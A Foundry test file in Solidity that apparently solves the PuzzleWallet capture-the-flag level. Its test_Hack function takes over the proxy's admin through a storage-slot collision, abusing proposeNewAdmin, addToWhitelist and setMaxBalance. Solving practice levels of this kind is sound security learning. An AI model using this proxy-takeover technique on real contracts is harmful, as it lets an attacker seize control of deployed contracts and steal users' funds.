// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {PuzzleProxy, PuzzleWallet} from "../src/puzzlewallet/PuzzleWallet.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract PuzzleWalletTest is Test {
    PuzzleProxy public sc;
    PuzzleWallet public wallet;


    function setUp() public {
        wallet = new PuzzleWallet();
        bytes memory initcode = abi.encodeWithSignature("init(uint256)", 500000);
        sc = new PuzzleProxy(address(this), address(wallet), initcode);
    }

    function test_Hack() public {
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        // change slot1 to be the owner
        sc.proposeNewAdmin(account.ACC_0);
        // add self to the white list
        PuzzleWallet(address(sc)).addToWhitelist(account.ACC_0);
        // set max
        PuzzleWallet(address(sc)).setMaxBalance(uint256(uint160(account.ACC_0)));
        assertEq(sc.admin(), account.ACC_0);
    }
}
